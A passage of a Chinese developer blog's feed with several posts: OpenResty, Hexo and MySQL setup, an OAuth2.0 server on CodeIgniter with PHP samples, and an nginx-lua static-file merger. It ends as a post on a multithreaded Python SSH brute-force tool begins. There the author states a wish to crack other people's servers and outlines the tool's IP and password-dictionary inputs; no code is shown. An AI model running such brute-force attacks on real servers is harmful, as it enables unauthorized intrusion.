sudo yum install -y readline-devel pcre-devel openssl-devel gcc gcc-c++ wget
wget https://openresty.org/download/openresty-1.11.2.3.tar.gz
tar -zxvf openresty-1.11.2.3.tar.gz
wget http://os20zg3p7.bkt.clouddn.com/note/wiznote/soft/pcre-8.39.zip
unzip pcre-8.39.zip
wget http://os20zg3p7.bkt.clouddn.com/note/wiznote/soft/openssl-1.0.2j.tar.gz
tar -zvxf openssl-1.0.2j.tar.gz
cd openresty-1.11.2.3
./configure --with-openssl=$curr_path/openssl-1.0.2j --with-pcre=$curr_path/pcre-8.39 --without-http_gzip_module --with-http_ssl_module
gmake &amp;&amp; sudo gmake install
</code></pre><p><br><hr></p>
<h1 id="0x03-Hexo"><a href="#0x03-Hexo" class="headerlink" title="0x03.Hexo"></a>0x03.Hexo</h1><p>安装hexo 3.0各种骂声，都是从2.8升上去的人喊的不兼容问题。</p>
<p>嗯…照着官网的打吧，一步一步走下来吧：</p>
<blockquote>
<p>npm install hexo-cli -g</p>
<p>hexo init</p>
<p>npm install </p>
<p>hexo server</p>
</blockquote>
<p>报错了：</p>
<pre><code>$ hexo s
{ [Error: Cannot find module &#39;./build/Release/DTraceProviderBindings&#39;] code: &#39;MODULE_NOT_FOUND&#39; }
{ [Error: Cannot find module &#39;./build/default/DTraceProviderBindings&#39;] code: &#39;MODULE_NOT_FOUND&#39; }
{ [Error: Cannot find module &#39;./build/Debug/DTraceProviderBindings&#39;] code: &#39;MODULE_NOT_FOUND&#39; }
ERROR Plugin load failed: hexo-server
</code></pre><p>后来看了下，问题很简单，少了几个库没装上，估计是天朝对外网络问题，没下载全就直接停掉了。</p>
<p>方案一：</p>
<p>换个国内npm源，然后：</p>
<blockquote>
<p>npm install hexo –no-optional</p>
</blockquote>
<p>方案二：</p>
<p>把之前的<code>node_modules</code>，放到新的目录下，大约50MB。</p>
<p>需要的可以mail我，base64 地址如下mailto: eGlhb2Nhby5ncmFzc2VzQGdtYWlsLmNvbQ==</p>
<p><br><hr></p>
<h1 id="0x04-Mysql"><a href="#0x04-Mysql" class="headerlink" title="0x04.Mysql"></a>0x04.Mysql</h1><blockquote>
<p>ERROR 2002 (HY000): Can’t connect to local MySQL server through socket ‘/tmp/mysql.sock’</p>
</blockquote>
<p>mysql的2002报错估计很多人都碰到过了，也就是，<code>/tmp/mysql.sock</code> 文件不存在的问题，没有<code>/tmp/mysql.sock</code>的话，就不能phpmyadmin等客户端进行连接了。</p>
<p>很多地方解决方法无非就是添加个link，把<code>/usr/var/mysql/mysqld.sock</code> 和 <code>/tmp/mysql.sock</code>关联起来吧，最后都不行。</p>
<p>mysql的默认配置文件为my.cnf，mysql默认回去这几个位置找这个文件，<br><code>/etc/my.cnf</code>,<br><code>/etc/mysql/my.cnf</code>,<br><code>/home/username/my.cnf</code>,<br><code>/home/username/.mysql/my.cnf</code>，</p>
<p>然而在MAC中，默认是没有配置文件的，那么你要自己去新建。</p>
<h2 id="下面是完整的解决方案："><a href="#下面是完整的解决方案：" class="headerlink" title="下面是完整的解决方案："></a>下面是完整的解决方案：</h2><ol>
<li>执行安装：</li>
</ol>
<blockquote>
<p>$ brew install mysql</p>
</blockquote>
<ol>
<li>在 /usr/local/etc/ 下创建或修改 my.cnf，示例：<br>```<br>[client]<br>port = 3306<br>socket = /tmp/mysql.sock<br>default-character-set = utf8</li>
</ol>
<p>[mysqld]<br>collation-server = utf8_unicode_ci<br>character-set-server = utf8<br>init-connect =’SET NAMES utf8’<br>max_allowed_packet = 64M<br>bind-address = 127.0.0.1<br>port = 3306<br>socket = /tmp/mysql.sock<br>innodb_file_per_table=1</p>
<p>[mysqld_safe]<br>timezone = ‘+0:00’</p>
<p>```</p>
<ol>
<li>赞安装完 mysql 后，他会提示你 init database，并提供下面这两句让你执行，很可能你没执行这两句</li>
</ol>
<blockquote>
<p>$ unset TMPDIR<br>$ mysql_install_db –verbose –user=<code>whoami</code> –basedir=”$(brew –prefix mysql)” –datadir=/usr/local/var/mysql –tmpdir=/tmp</p>
</blockquote>
<ol>
<li>然后就可以指向 mysql.server start 来启动了，为了安全，你还可以执行安全设置向导，根据提示一步一步配置</li>
</ol>
<blockquote>
<p>$ mysql_secure_installation</p>
</blockquote>
<p><br><hr></p>
<p>这里只记下几个重装的痛点，各种蛋疼，于是爽爽地入docker了，期待docker能有新发现。</p>
<p>将来，待续…</p>
<p><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-07-10-rebuild-osx-environment"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-07-10-rebuild-osx-environment" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2015/07/10/rebuild-osx-environment/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/07/10/rebuild-osx-environment/">http://homeway.me/2015/07/10/rebuild-osx-environment/</a></h4><p><br><br>-by小草</p>
<p>2015-07-10 21:35:10</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CI环境下开发Oauth2.0开放平台]]></title>
      <url>http://homeway.me/2015/06/29/build-oauth2-under-codeigniter/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-oauth2.png" alt="Oauth2.0"></p>
<a id="more"></a>
<p><br></p>
<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>最近在搭建Oauth2.0第三方接入开放平台，主要是使用Github开源项目服务模块<a href="https://github.com/bshaffer/oauth2-server-php" target="_blank" rel="external">https://github.com/bshaffer/oauth2-server-php</a>和CodeIgniter结合。</p>
<p>一般来说做开放平台主要包括：Oauth2.0认证平台、Resource资源API平台、Open开发者注册平台，以及API说明等。</p>
<p>Oauth2.0测试平台已经搭建好，请访问 <a href="http://oauth2.homeway.me/oauth/test/" target="_blank" rel="external">http://oauth2.homeway.me/oauth/test/</a></p>
<p><hr><br></p>
<h1 id="0x02-About-Oauth2-0"><a href="#0x02-About-Oauth2-0" class="headerlink" title="0x02.About Oauth2.0"></a>0x02.About Oauth2.0</h1><p>OAuth 2.0授权前，第三方应用必须到平台上进行注册，注册过程中可能需要填写的内容有：应用类型，授权成功回调地址，以及其他平台需要的资料（应用名称、网址、介绍、LOGO图片等）。</p>
<p>OAuth 2.0标准主要围绕三类应用：Web应用、基于客户端的应用、原生应用。</p>
<p>应用在Open开发者平台注册完成会得到一个应用client_id和一个client_secret，一般叫<code>App Key</code>，密钥叫<code>App Secret</code>，这两样东西作用跟用户名密码是一样的。</p>
<p><a href="http://tools.ietf.org/html/rfc6749" target="_blank" rel="external">OAuth 2.0 RFC</a> 中提到的授权方式有四种：授权码（Authorization Code）、隐式授权（Implicit Grant）、用户口令（Resource Owner Password Credentials）、应用口令（Client Credentials）。</p>
<p>这四种方式最终的目的都是要获得Access Token，然后通过请求Resource服务器获取资源。</p>
<p><hr><br></p>
<h1 id="0x03-Grant-type"><a href="#0x03-Grant-type" class="headerlink" title="0x03.Grant_type"></a>0x03.Grant_type</h1><p>说说每种授权方式使用到的地方，或授权的方式。</p>
<h2 id="Authorization-Code"><a href="#Authorization-Code" class="headerlink" title="Authorization Code"></a>Authorization Code</h2><p><img src="https://static.blog.homeway.me/blog/2015-06-28-build-oauth2-under-codeigniter-authorization_1.jpg" alt="Authorization Code"></p>
<p>授权码方式在很多地方都有用到，微博登陆，微信登陆等都是。</p>
<p>认证过程主要是跳转到Oauth2.0平台，认证后跳转回第三方应用平台，并通过callback的url中携带code、state、token_type等信息，然后第三方平台通过code获取到access_token，进而调用开放API获取到资源。</p>
<p>第三方请求过程必须附带，<code>response_type</code>（回调类型：code，token）,<code>client_id</code>（开发者app key）,<code>redirect_uri</code>（回调链接），<code>state</code>（防止csrf，authorization认证跳转后原样返回）。</p>
<p>例如：<a href="http://localhost:8085/oauth2/authorize/index?redirect_uri=http://homeway.me&amp;response_type=code&amp;client_id=testclient&amp;state=ae5f8c93dc51d856d6536aec528c31c6f6450458" target="_blank" rel="external">http://localhost:8085/oauth2/authorize/index?redirect_uri=http://homeway.me&amp;response_type=code&amp;client_id=testclient&amp;state=ae5f8c93dc51d856d6536aec528c31c6f6450458</a></p>
<p>测试例子：<a href="http://brentertainment.com/oauth2/" target="_blank" rel="external">http://brentertainment.com/oauth2/</a></p>
<p>第一步：跳转到Oauth2.0服务器：</p>
<p>认证过程中会请求<code>scope</code>权限表，用户可以拒绝相应权限。</p>
<p><img src="https://static.blog.homeway.me/blog/2015-06-28-build-oauth2-under-codeigniter-authorization_2.jpg" alt="跳转到Oauth2.0服务器"></p>
<p>第二步：用户确认请求的权限，回调得到code：</p>
<p><img src="https://static.blog.homeway.me/blog/2015-06-28-build-oauth2-under-codeigniter-authorization_3.jpg" alt="用户确认请求的权限"></p>
<p>第三步：第三方平台通过code得到access_token，然后通过API调用Resource服务器资源。</p>
<p>这个过程需要发送<code>client_id</code>，<code>client_secret</code>（App Secret），<code>grant_type</code>（’authorization_code’），<code>code</code>，<code>redirect_uri</code>给oauth2服务器获取<code>access_token</code>。</p>
<p>例如：<a href="http://brentertainment.com/oauth2/client/request_token/authorization_code?code=bab6b7dee32f629397acbb16a4d8e50c6c3d424d" target="_blank" rel="external">http://brentertainment.com/oauth2/client/request_token/authorization_code?code=bab6b7dee32f629397acbb16a4d8e50c6c3d424d</a></p>
<p><br></p>
<h2 id="Implicit-Grant"><a href="#Implicit-Grant" class="headerlink" title="Implicit Grant"></a>Implicit Grant</h2><p>隐式授权流程（Implicit Grant）其实就是Authorization Code的一个简化版本，不是回调code，而是直接回调access_token给第三方开发者，<code>response_type</code>变为token，其他和Authorization Code一样。</p>
<p>例如：<a href="http://brentertainment.com/oauth2/lockdin/authorize?response_type=token&amp;client_id=demoapp&amp;redirect_uri=http%3A%2F%2Fbrentertainment.com%2Foauth2%2Fclient%2Freceive_implicit_token&amp;state=377edd18bd3070e4317889b0b3371c16" target="_blank" rel="external">http://brentertainment.com/oauth2/lockdin/authorize?response_type=token&amp;client_id=demoapp&amp;redirect_uri=http%3A%2F%2Fbrentertainment.com%2Foauth2%2Fclient%2Freceive_implicit_token&amp;state=377edd18bd3070e4317889b0b3371c16</a></p>
<p>跳转后就得到了，如下链接：<a href="http://brentertainment.com/oauth2/client/receive_implicit_token#access_token=a845c2c81bc57613bbc5dee1fec173a3fbd0f474&amp;expires_in=3600&amp;token_type=Bearer&amp;state=377edd18bd3070e4317889b0b3371c16" target="_blank" rel="external">http://brentertainment.com/oauth2/client/receive_implicit_token#access_token=a845c2c81bc57613bbc5dee1fec173a3fbd0f474&amp;expires_in=3600&amp;token_type=Bearer&amp;state=377edd18bd3070e4317889b0b3371c16</a></p>
<p><br></p>
<h2 id="Client-Credentials"><a href="#Client-Credentials" class="headerlink" title="Client Credentials"></a>Client Credentials</h2><p>应用授权（Client Credentials）主要用于第三方应用直接获取一些公开的数据，不需要用户跳转认证，也不需要获取用户的openid，因为都是一些公共的资源。</p>
<p><img src="https://static.blog.homeway.me/blog/2015-06-28-build-oauth2-under-codeigniter-client-credentials_2.jpg" alt="Client Credentials"></p>
<p>我的请求数据为：<code>{client_id: &quot;testclient&quot;, client_secret: &quot;testpass&quot;, grant_type: &quot;client_credentials&quot;, scope: &quot;userinfo cloud file node&quot;}</code></p>
<p>Oauth2给我的回调数据：<code>{&quot;access_token&quot;:&quot;417206d0e162d743338c04da9f8eb72f99daff6b&quot;,&quot;expires_in&quot;:3600,&quot;token_type&quot;:&quot;Bearer&quot;,&quot;scope&quot;:&quot;userinfo cloud file node&quot;}</code></p>
<p>可以看到有了access_token，然后我就可以用access_token去找Resource服务器要资源了，这里限定了<code>scope</code>权限表，表的权限在open平台注册的时候就确定下来了。</p>
<p><br></p>
<h2 id="Resource-Owner-Password-Credentials"><a href="#Resource-Owner-Password-Credentials" class="headerlink" title="Resource Owner Password Credentials"></a>Resource Owner Password Credentials</h2><p>用户口令（Resource Owner Password Credentials）适合内部应用调用使用，比如公司有两个平台，A和B，那么我就可以在Oauth2下通过<code>Password Credentials</code>模式实现A应用与B应用之间通信，还可以开放内部接口。</p>
<p><img src="https://static.blog.homeway.me/blog/2015-06-28-build-oauth2-under-codeigniter-client-credentials_1.jpg" alt="Client Credentials"></p>
<p>请求的数据格式是：<br><code>{grant_type: &quot;password
username:&quot;user&quot;, password: &quot;pass&quot;,client_id: &quot;&quot;testclient&quot;, client_secret: &quot;testpass&quot;, scope: &quot;userinfo cloud file node}</code></p>
<p>回调数据比Client Credentials多了一个<code>refresh_token</code>:</p>
<p><code>{&quot;access_token&quot;:&quot;8a478275f8d2d5ac767f94ef0684a1fc2883eb24&quot;,
&quot;expires_in&quot;:3600,
&quot;token_type&quot;:&quot;Bearer&quot;,
&quot;scope&quot;:&quot;userinfo cloud file node&quot;,
&quot;refresh_token&quot;:&quot;69a5e7b995ed4376bd6dd58380bfe09b51137dcb&quot;}</code></p>
<p>那么当<code>access_token</code>过期后，就可以通过<code>refresh_token</code>再次激活一个新的<code>access_token</code>，黑魔法，自己给自己开后门。</p>
<p>激活请求发送的数据为：<br><code>{grant_type: &quot;refresh_token&quot;,
username:&quot;user&quot;, password: &quot;pass&quot;, client_id: &quot;&quot;testclient&quot;, client_secret: &quot;testpass&quot;, scope: &quot;userinfo cloud file node}</code></p>
<p>返回还是一个新的access_token数据。</p>
<p><hr><br></p>
<h1 id="0x04-CodeIgniter与Oauth2-0"><a href="#0x04-CodeIgniter与Oauth2-0" class="headerlink" title="0x04.CodeIgniter与Oauth2.0"></a>0x04.CodeIgniter与Oauth2.0</h1><p>四种授权方式都说过了，那么就开始搭建基于CodeIgniter的Oauth2.0平台了。</p>
<h2 id="基础环境搭建"><a href="#基础环境搭建" class="headerlink" title="基础环境搭建"></a>基础环境搭建</h2><p>1.下载CI框架：<code>$wget https://codeload.github.com/bcit-ci/CodeIgniter/zip/3.0.0</code></p>
<p>2.解压 <code>$unzip CodeIgniter-3.0.0.zip</code></p>
<p>3.进入library目录 <code>$cd CodeIgniter-3.0.0/application/libraries</code> </p>
<p>4.获取oauth2-php-server: <code>git clone https://github.com/bshaffer/oauth2-server-php &amp;&amp; mv -f oauth2-server-php oauth2</code></p>
<p>5.通过composer安装 oauth2-server-php ：<code>cd oauth2 &amp;&amp; composer install</code></p>
<p>如果国内composer安装慢的话，我打了一个包，可以再这里下载到：<a href="http://785igi.com1.z0.glb.clouddn.com/share/oauth2-server-php.zip" target="_blank" rel="external">oauth2-server-php.zip</a></p>
<h2 id="Oauth2-0数据库"><a href="#Oauth2-0数据库" class="headerlink" title="Oauth2.0数据库"></a>Oauth2.0数据库</h2><p>好了，ci和oauth2都处理好了，接下来导入下数据库的sql文件。</p>
<p>oauth2.0平台支持多种数据库，可以在<code>oauth2/src/Oauth2/Storage/</code>里面看到，有mongodb、mysql、redis等。</p>
<p>这里就选简单的mysql吧，数据库主要包含oauth_access_tokens、oauth_authorization_codes、oauth_clients、oauth_jwt、oauth_refresh_tokens、oauth_scopes、oauth_users几个表。</p>
<p><code>oauth_users</code>是Password Credentials认证的时候用的表，<code>oauth_scopes</code>存放权限表，<code>oauth_refresh_tokens</code>是Password Credentials认证的时候的refresh_token表，<code>oauth_clients</code>存放开发者注册的信息表。</p>
<p>sql文件可以在这里下载：<a href="http://homeway.me/code/oauth2.sql">http://homeway.me/code/oauth2.sql</a></p>
<h2 id="Server服务"><a href="#Server服务" class="headerlink" title="Server服务"></a>Server服务</h2><p>接下来在<code>CodeIgniter-3.0.0/application/libraries/oauth2</code>里面新建一个<code>server.php</code>，<br>用于对oauth2内调用与对外ci服务的接口。</p>
<p>###创建一个Authorization Code服务</p>
<pre><code>class Server{
  function __construct(){
    OAuth2\Autoloader::register();
    $this-&gt;storage = new OAuth2\Storage\Pdo(array(&#39;dsn&#39; =&gt; &#39;mysql:dbname=oauth;host=localhost&#39;, &#39;username&#39; =&gt; &#39;&#39;, &#39;password&#39; =&gt; &#39;&#39;));
    $this-&gt;server = new OAuth2\Server($this-&gt;storage, array(&#39;allow_implicit&#39; =&gt; true));
    $this-&gt;request = OAuth2\Request::createFromGlobals();
    $this-&gt;response = new OAuth2\Response();
  }
  public function authorize($is_authorized){
    $this-&gt;server-&gt;addGrantType(new OAuth2\GrantType\AuthorizationCode($this-&gt;storage));
    $this-&gt;server-&gt;handleAuthorizeRequest($this-&gt;request, $this-&gt;response, $is_authorized);
    if ($is_authorized) {
      $code = substr($response-&gt;getHttpHeader(&#39;Location&#39;), strpos($response-&gt;getHttpHeader(&#39;Location&#39;), &#39;code=&#39;)+5, 40);
      header(&quot;Location: &quot;.$response-&gt;getHttpHeader(&#39;Location&#39;));
    }
    $response-&gt;send();
  }
}
</code></pre><p>###创建一个Password Credentials服务</p>
<pre><code>class Server{
  function __construct(){
    OAuth2\Autoloader::register();
    $this-&gt;storage = new OAuth2\Storage\Pdo(array(&#39;dsn&#39; =&gt; &#39;mysql:dbname=oauth;host=localhost&#39;, &#39;username&#39; =&gt; &#39;&#39;, &#39;password&#39; =&gt; &#39;&#39;));
    $this-&gt;server = new OAuth2\Server($this-&gt;storage, array(&#39;allow_implicit&#39; =&gt; true));
    $this-&gt;request = OAuth2\Request::createFromGlobals();
    $this-&gt;response = new OAuth2\Response();
  }
  public function password_credentials(){
    $users = array(&quot;user&quot; =&gt; array(&quot;password&quot; =&gt; &#39;pass&#39;, &#39;first_name&#39; =&gt; &#39;homeway&#39;, &#39;last_name&#39; =&gt; &#39;yao&#39;));
    $storage = new OAuth2\Storage\Memory(array(&#39;user_credentials&#39; =&gt; $users));//user是认证的账户，在表oauth_users中
    $this-&gt;server-&gt;addGrantType(new OAuth2\GrantType\UserCredentials($storage));
    $this-&gt;server-&gt;handleTokenRequest($this-&gt;request)-&gt;send();
  }
}
</code></pre><p>###创建一个Client Credentials服务</p>
<pre><code>class Server{
  function __construct(){
    OAuth2\Autoloader::register();
    $this-&gt;storage = new OAuth2\Storage\Pdo(array(&#39;dsn&#39; =&gt; &#39;mysql:dbname=oauth;host=localhost&#39;, &#39;username&#39; =&gt; &#39;&#39;, &#39;password&#39; =&gt; &#39;&#39;));
    $this-&gt;server = new OAuth2\Server($this-&gt;storage, array(&#39;allow_implicit&#39; =&gt; true));
    $this-&gt;request = OAuth2\Request::createFromGlobals();
    $this-&gt;response = new OAuth2\Response();
  }
  public function client_credentials(){
    $this-&gt;server-&gt;addGrantType(new OAuth2\GrantType\ClientCredentials($this-&gt;storage, array(&quot;allow_credentials_in_request_body&quot; =&gt; true)));
    $this-&gt;server-&gt;handleTokenRequest($this-&gt;request)-&gt;send();
  }
}
</code></pre><p>###创建一个refresh_token服务</p>
<pre><code>class Server{
  function __construct(){
    OAuth2\Autoloader::register();
    $this-&gt;storage = new OAuth2\Storage\Pdo(array(&#39;dsn&#39; =&gt; &#39;mysql:dbname=oauth;host=localhost&#39;, &#39;username&#39; =&gt; &#39;&#39;, &#39;password&#39; =&gt; &#39;&#39;));
    $this-&gt;server = new OAuth2\Server($this-&gt;storage, array(&#39;allow_implicit&#39; =&gt; true));
    $this-&gt;request = OAuth2\Request::createFromGlobals();
    $this-&gt;response = new OAuth2\Response();
  }
  public function refresh_token(){
    $this-&gt;server-&gt;addGrantType(new OAuth2\GrantType\RefreshToken($this-&gt;storage, array(
         &quot;always_issue_new_refresh_token&quot; =&gt; true,
      &quot;unset_refresh_token_after_use&quot; =&gt; true,
      &quot;refresh_token_lifetime&quot; =&gt; 2419200,
    )));
    $this-&gt;server-&gt;handleTokenRequest($this-&gt;request)-&gt;send();
  }
}
</code></pre><h1 id="0x04-About-Package"><a href="#0x04-About-Package" class="headerlink" title="0x04.About Package"></a>0x04.About Package</h1><p>篇幅太大了，我觉定，把代码打包下来，好了。^.().^</p>
<p><a href="http://785igi.com1.z0.glb.clouddn.com/share/build-oauth2-under-codeigniter.zip" target="_blank" rel="external">http://homeway.me/code/build-oauth2-under-codeigniter.zip</a></p>
<p>下面是打包好的测试平台你也可以通过<a href="http://oauth2.homeway.me/oauth/test/" target="_blank" rel="external">http://oauth2.homeway.me/oauth/test/</a>来进入测试平台。</p>
<p>平台web访问路径为：<code>/oauth/test/</code>、<code>/oauth2/RefreshToken</code>,<code>/oauth2/resource</code>,<code>/oauth2/authorize/token</code>,<code>/oauth2/PasswordCredentials</code>,<code>/oauth2/ClientCredentials</code>，你也可以从相应的源码中读到这些地址。</p>
<p><img src="https://static.blog.homeway.me/blog/2015-06-28-build-oauth2-under-codeigniter.jpg" alt="build-oauth2-under-codeigniter"></p>
<p><hr><br></p>
<p>参考：</p>
<p>1.<a href="http://tools.ietf.org/html/rfc6749#section-4.3" target="_blank" rel="external">http://tools.ietf.org/html/rfc6749</a><br>2.<a href="http://brentertainment.com/oauth2/" target="_blank" rel="external">http://brentertainment.com/oauth2/</a><br>3.<a href="http://bshaffer.github.io/oauth2-server-php-docs/" target="_blank" rel="external">oauth2-server-php-docs</a><br>4.<a href="http://open.weibo.com/wiki/%E6%8E%88%E6%9D%83%E6%9C%BA%E5%88%B6%E8%AF%B4%E6%98%8E" target="_blank" rel="external">新浪oauth2授权机制说明</a><br>5.<a href="http://wiki.open.qq.com/wiki/mobile/OAuth2.0%E7%AE%80%E4%BB%8B" target="_blank" rel="external">腾讯OAuth2.0简介</a><br>6.<a href="http://connect.qq.com/sdk/webtools/index.html" target="_blank" rel="external">腾讯API调试平台</a></p>
<p><br><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-06-29-build-oauth2-under-codeigniter"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-06-29-build-oauth2-under-codeigniter" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2015/06/29/build-oauth2-under-codeigniter/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/06/29/build-oauth2-under-codeigniter/">http://homeway.me/2015/06/29/build-oauth2-under-codeigniter/</a></h4><p>-by小草</p>
<p>2015-06-29 02:04:10</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Nginx+Lua服务端合并静态文件]]></title>
      <url>http://homeway.me/2015/06/22/nginx-lua-static-merger/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-nginx-lua.png" alt="nginx-lua-static-merger"></p>
<a id="more"></a>
<p><br></p>
<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>源码已经上传到github:<a href="https://github.com/grasses/nginx-lua-static-merger" target="_blank" rel="external">https://github.com/grasses/nginx-lua-static-merger</a></p>
<p><code>nginx-lua-static-merger</code>是一个基于openresty的模块，主要用于合并静态文件，减少http请求，加快静态文件访问速度的模块。</p>
<p>使用<code>nginx-lua-static-merger</code> 需要在编译nginx时候添加openresty的模块，或者直接安装openresty作为服务器。</p>
<p><code>nginx-lua-static-merger</code>可以让你的js、css请求不要那么多，一个就够了。</p>
<p><img src="https://static.blog.homeway.me/blog/2015-06-22-nginx-lua-static-merger-look.jpg" alt="nginx-lua-static-merger"></p>
<p><hr><br></p>
<h1 id="0x02-About-Nginx"><a href="#0x02-About-Nginx" class="headerlink" title="0x02.About Nginx"></a>0x02.About Nginx</h1><h2 id="nginx工作"><a href="#nginx工作" class="headerlink" title="nginx工作"></a>nginx工作</h2><p>先从nginx原理来看nginx处理http请求的过程。</p>
<p>Nginx的模块从功能上分为如下三类:</p>
<p>Handlers（处理器模块），直接处理请求，并进行输出内容和修改headers信息等操作。Handlers处理器模块一般只能有一个。</p>
<p>Filters （过滤器模块），主要对其他处理器模块输出的内容进行修改操作，最后由Nginx输出。</p>
<p>Proxies （代理类模块），Nginx的HTTP Upstream之类的模块，这些模块主要与后端一些服务比如FastCGI等进行交互，实现服务代理和负载均衡等功能。</p>
<p><img src="https://static.blog.homeway.me/blog/2015-06-22-nginx-lua-static-merger-nginx-handler-http.png" alt="nginx 处理http请求"></p>
<p>也就是说，一个http请求过来，nginx先处理请求信息，然后过滤信息，最后丢给代理来处理，它本身处理的东西并不多，它仅仅是通过查找配置文件将此次请求映射到一个location block，而此location中所配置的各个指令则会启动不同的模块去完成工作。</p>
<p>从正常来看，一个页面加载10来个js、css是正常的，还有10来个图片，即使是什么也不干，那么一个页面也要处理掉20多个http请求，每个http请求都要跑一遍TCP请求，nginx回应，过滤，分配。</p>
<h2 id="speed-test："><a href="#speed-test：" class="headerlink" title="speed test："></a>speed test：</h2><p>看张图吧，国外一个网速测试工具：</p>
<p><img src="https://static.blog.homeway.me/blog/2015-06-22-nginx-lua-static-merger-reguest.jpg" alt="一个页面请求消耗的时间"></p>
<p>去掉首页<code>index.html</code>的加载时间，可以看到，加载静态文件css，js时间耗费了很长的等待时间，并且image的加载是在js和css加载完后才加载的，也就是说，如果js或css加载慢了，那么页面就慢了。</p>
<p>这个页面是github.com/grasses。</p>
<p><hr><br></p>
<h1 id="0x02-Usage"><a href="#0x02-Usage" class="headerlink" title="0x02.Usage"></a>0x02.Usage</h1><h2 id="Openresty"><a href="#Openresty" class="headerlink" title="Openresty"></a>Openresty</h2><p><a href="http://openresty.org/cn/" target="_blank" rel="external">http://openresty.org/cn/</a></p>
<p>Openresty是国人写的开源项目，打包了标准的 Nginx 核心，很多的常用的第三方模块，以及它们的大多数依赖项。</p>
<pre><code>tar xzvf ngx_openresty-VERSION.tar.gz
cd ngx_openresty-VERSION/
./configure
make
make install
</code></pre><p>详细的安装教程还是去看官网吧。</p>
<h2 id="file-path"><a href="#file-path" class="headerlink" title="file path"></a>file path</h2><pre><code>|--/usr/local/openresty/nginx
|                        `--lua 
|                            `--nginx-lua-static-merger.lua
|                        `--conf 
|                            `--nginx.lua
|--/www/openresty/static
|                `--js
|                `--css
|                `--cache
</code></pre><p>注意</p>
<p>1、<code>nginx.conf</code>中的<code>lua_package_path &quot;/usr/local/openresty/lualib/?.lua;;&quot;;</code>和<br><code>lua_package_cpath &quot;/usr/local/openresty/lualib/?.so;;&quot;;</code>，如果你是编译nginx而不是直接安装openresty，目录记得放对。</p>
<p>2、确保<code>/www/openresty/static</code>有Lua写的权限。</p>
<h2 id="use"><a href="#use" class="headerlink" title="use"></a>use</h2><p>前端调用方法如下：</p>
<pre><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;/bootstrap/css/bootstrap.min.css;/qiniu/css/main.css;/css/navbar.css&quot;&gt;
&lt;script src=&quot;/js/jquery.min.js;/js/main.js;/qiniu/bootstrap/js/bootstrap.min.js;/qiniu/js/plupload/plupload.full.min.js;/qiniu/js/plupload/i18n/zh_CN.js&quot;&gt;&lt;/script&gt;
</code></pre><p><hr><br></p>
<h1 id="0x03-How-it-work"><a href="#0x03-How-it-work" class="headerlink" title="0x03.How it work"></a>0x03.How it work</h1><p>Nginx在location通过 <code>content_by_lua_file</code> 把接下来的处理丢个Lua做逻辑。</p>
<p>Lua通过uri进行md5编码，判断cache是否存在，如果cache不存在，循环分割、遍历uri，访问响应的路径，查找静态文件，存在则记录，最后写cache入文件，方便下次访问。</p>
<p><img src="https://static.blog.homeway.me/blog/2015-06-22-nginx-lua-static-merger-how-work.jpg" alt="how nginx-lua-static-merger work"></p>
<p><hr><br></p>
<h1 id="0x04-Effect"><a href="#0x04-Effect" class="headerlink" title="0x04.Effect"></a>0x04.Effect</h1><p>下面是在不作处理情况请求多个js结果：</p>
<p><img src="https://static.blog.homeway.me/blog/2015-06-22-normal_http_get.jpg" alt="不做处理"></p>
<p>下面是第一次请求下，lua既要获取数据又要合并生成cache，属于冷数据：</p>
<p><img src="https://static.blog.homeway.me/blog/2015-06-22-cold_js_by_ngx_static_merger_2.jpg" alt="cold_js_by_ngx_static_merger"></p>
<p><img src="https://static.blog.homeway.me/blog/2015-06-22-cold_js_by_ngx_static_merger_1.jpg" alt="cold_js_by_ngx_static_merger"></p>
<p>第二次访问就是热数据了，访问速度是增加的：</p>
<p><img src="https://static.blog.homeway.me/blog/2015-06-22-hot_js_time.jpg" alt="热数据"></p>
<p><br><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-06-22-nginx-lua-static-merger"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-06-22-nginx-lua-static-merger" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2015/06/22/nginx-lua-static-merger/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/06/22/nginx-lua-static-merger/">http://homeway.me/2015/06/22/nginx-lua-static-merger/</a></h4><p><br><br>-by小草</p>
<p>2015-06-22 20:04:10</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[python多线程ssh爆破]]></title>
      <url>http://homeway.me/2015/06/20/python-violence-ssh-attack/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-python.png" alt="Python"></p>
<a id="more"></a>
<p><br><hr><br></p>
<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>这几天发现朋友的服务器22被人爆了，于是想想，也想去爆别人服务器。</p>
<p>爆弱口令时候写的一个python小脚本，主要功能是实现使用字典多线程爆破ssh，支持ip表导入，字典数据导入。</p>
<p>主要使用到的是python的paramiko模块和多线程threading模块。</p>
<p>那么，首先要准备的是字典dict、服务器ip表。</p>
<p>东西很简单，主要默认目录如下：</p>
<pre><code>|--ssh.scan.py
|--/log:
    sshd
|--/dict:
    ip
    password
</code></pre><p>ip和password按照一行一个放置。</p>
<p><hr><br></p>
